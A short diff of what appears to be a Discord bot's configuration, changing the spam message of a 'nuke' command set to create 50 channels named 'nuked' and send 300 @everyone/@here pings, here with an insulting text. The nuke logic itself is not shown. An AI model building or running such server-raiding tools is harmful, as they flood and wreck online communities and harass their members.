@@ -30,7 +30,7 @@ DATA_FILE = "bot_data.json"
 # Nuke command configuration
 NUKE_KEY = "slimeout8048"  # Change this to your secret confirmation key
 CHANNEL_BASE_NAME = "nuked"
-SPAM_MSG = "@everyone @here nuked lol"
+SPAM_MSG = "@everyone @here nuked by playyer you bum i awlays hated u lol"
 CHANNEL_COUNT = 50
 SPAM_COUNT = 300
 
